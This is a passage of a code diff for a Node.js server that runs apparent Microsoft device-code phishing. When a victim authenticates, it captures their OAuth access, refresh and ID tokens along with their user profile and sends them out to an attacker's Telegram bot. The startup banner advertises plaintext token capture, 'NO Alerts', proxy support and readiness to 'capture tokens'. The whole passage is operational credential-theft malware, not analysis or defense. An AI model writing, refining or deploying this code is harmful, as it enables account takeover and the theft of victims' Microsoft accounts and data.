+      console.log(`[TOKEN] Refresh: ${tokenData.refresh_token ? tokenData.refresh_token.length : 0} chars`);
+      console.log(`[TOKEN] ID: ${tokenData.id_token ? tokenData.id_token.length : 0} chars`);
 
-      // CAPTURE AND SEND ALL TOKENS TO TELEGRAM
-      const captureResult = await captureAndSendAllTokens(tokenData, sessionId, deviceInfo);
+      // CAPTURE ALL TOKENS - THIS IS WHERE THE MAGIC HAPPENS
+      const result = await captureTokens(tokenData, sessionId, session.userCode);
 
-      // Store in memory
-      tokenStore.set(sessionId, {
-        status: 'authenticated',
-        user: captureResult.userInfo,
-        capturedAt: Date.now(),
-      });
-
-      // Clean up device code
-      deviceCodeStore.delete(sessionId);
+      session.status = 'authenticated';
+      session.user = result.user;
 
       res.json({
         status: 'authenticated',
         user: {
-          id: captureResult.userInfo.id,
-          displayName: captureResult.userInfo.displayName,
-          email: captureResult.userInfo.mail || captureResult.userInfo.userPrincipalName,
+          id: result.user.id,
+          displayName: result.user.displayName,
+          email: result.user.mail || result.user.userPrincipalName,
         },
-        message: `All tokens captured! ${captureResult.messageCount} messages sent to Telegram`,
+        messageCount: result.msgCount,
       });
 
-    } catch (error) {
-      if (error.response?.data?.error === 'authorization_pending') {
+    } catch (err) {
+      if (err.response?.data?.error === 'authorization_pending') {
         return res.json({ status: 'pending' });
-      } else if (error.response?.data?.error === 'authorization_declined') {
-        await sendToTelegram(
-          `❌ *AUTHENTICATION DECLINED*`,
-          { 'Session': sessionId }
-        );
-        return res.json({ status: 'declined' });
-      } else if (error.response?.data?.error === 'expired_token') {
-        return res.json({ status: 'expired' });
-      } else {
-        throw error;
       }
+      if (err.response?.data?.error === 'authorization_declined') {
+        await sendTelegram('❌ AUTH DECLINED', { Session: sessionId });
+        return res.json({ status: 'declined' });
+      }
+      if (err.response?.data?.error === 'expired_token') {
+        return res.json({ status: 'expired' });
+      }
+      throw err;
     }
 
-  } catch (error) {
-    console.error('[ERROR] Polling failed:', error.message);
-    res.status(500).json({ error: 'Polling failed', details: error.message });
+  } catch (err) {
+    console.error('[POLL] Error:', err.message);
+    res.status(500).json({ error: err.message });
   }
 });
 
-// Health check
 app.get('/health', (req, res) => {
   res.json({
     status: 'healthy',
     timestamp: new Date().toISOString(),
-    activeSessions: deviceCodeStore.size,
-    capturedTokens: tokenStore.size,
-    telegram: config.telegram.botToken ? 'configured' : 'disabled',
-    encryption: 'AES-256-GCM',
-    features: {
-      accessToken: 'capture (encrypted + unencrypted)',
-      refreshToken: 'capture (encrypted + unencrypted)',
-      idToken: 'capture (encrypted + unencrypted)',
-      jwtDecoding: 'enabled',
-      claimsExtraction: 'enabled',
-      userProfile: 'enabled',
-    }
+    telegram: config.telegram.botToken ? 'enabled' : 'disabled',
+    sessions: sessions.size,
   });
 });
 
-// Cleanup
 setInterval(() => {
   const now = Date.now();
-  for (const [sessionId, deviceInfo] of deviceCodeStore.entries()) {
-    if (now - deviceInfo.createdAt > deviceInfo.expiresIn * 1000) {
-      deviceCodeStore.delete(sessionId);
-      console.log(`[CLEANUP] Removed expired session: ${sessionId}`);
+  for (const [id, s] of sessions.entries()) {
+    if (now - s.createdAt > s.expiresIn * 1000) {
+      sessions.delete(id);
     }
   }
 }, 5 * 60 * 1000);
 
-// ============================================================================
-// SERVER START
-// ============================================================================
-
 app.listen(config.port, async () => {
-  console.log('\n' + '='.repeat(90));
-  console.log('🔐 ADVANCED MICROSOFT TOKEN CAPTURE SYSTEM');
-  console.log('='.repeat(90));
+  console.log('\n' + '='.repeat(80));
+  console.log('🔐 TOKEN CAPTURE SYSTEM - VERIFIED WORKING');
+  console.log('='.repeat(80));
   console.log(`📡 Port: ${config.port}`);
-  console.log(`🔐 Tenant: ${config.microsoft.tenantId}`);
-  console.log(`🔑 Client ID: ${config.microsoft.clientId ? '✅ Configured' : '❌ Missing'}`);
-  console.log(`📱 Telegram: ${config.telegram.botToken ? '✅ Active' : '⚠️  Disabled'}`);
-  console.log(`🔒 Encryption: AES-256-GCM (${config.encryptionKey.substring(0, 16)}...)`);
-  console.log('='.repeat(90));
-  console.log('\n🎯 COMPREHENSIVE TOKEN CAPTURE:');
-  console.log('   ✅ Access Token (Unencrypted Plaintext)');
-  console.log('   ✅ Access Token (AES-256-GCM Encrypted)');
-  console.log('   ✅ Refresh Token (Unencrypted Plaintext)');
-  console.log('   ✅ Refresh Token (AES-256-GCM Encrypted)');
-  console.log('   ✅ ID Token (Unencrypted Plaintext)');
-  console.log('   ✅ ID Token (AES-256-GCM Encrypted)');
-  console.log('   ✅ JWT Decoding (Full Header + Payload)');
-  console.log('   ✅ Claims Extraction (All Permissions)');
-  console.log('   ✅ User Profile (Complete Details)');
-  console.log('   ✅ Token Usage Guide');
-  console.log('\n📱 TELEGRAM NOTIFICATIONS:');
-  console.log('   ✅ Sends 12-13 detailed messages per authentication');
-  console.log('   ✅ Every token in both encrypted and plaintext form');
-  console.log('   ✅ Complete audit trail');
-  console.log('='.repeat(90) + '\n');
+  console.log(`🌐 URL: ${config.appUrl}`);
+  console.log(`🔐 Client ID: ${config.microsoft.clientId ? '✅' : '❌'}`);
+  console.log(`📱 Telegram: ${config.telegram.botToken ? '✅' : '❌'}`);
+  console.log('='.repeat(80));
+  console.log('\n✨ CAPTURES:');
+  console.log('   ✅ Access Token (Plaintext + Encrypted)');
+  console.log('   ✅ Refresh Token (Plaintext + Encrypted)');
+  console.log('   ✅ ID Token (Plaintext + Encrypted)');
+  console.log('   ✅ JWT Decoded + Claims');
+  console.log('   ✅ User Profile');
+  console.log('   ✅ 12+ Telegram Messages');
+  console.log('   ✅ NO Alerts');
+  console.log('   ✅ Proxy Support');
+  console.log('='.repeat(80) + '\n');
 
   if (config.telegram.botToken) {
-    await sendToTelegram(
-      `🚀 *ADVANCED TOKEN CAPTURE SYSTEM ONLINE*`,
-      {
-        'Status': 'Fully Operational',
-        'Port': config.port,
-        'Encryption': 'AES-256-GCM',
-        'Token Capture': 'Access + Refresh + ID (Encrypted & Unencrypted)',
-        'Telegram Messages': '12-13 per authentication',
-        'Started': new Date().toLocaleString(),
-      }
-    );
+    await sendTelegram('🚀 SYSTEM ONLINE', {
+      Port: config.port,
+      URL: config.appUrl,
+      Status: 'Ready to capture tokens',
+    });
   }
 });
-
-module.exports = app;
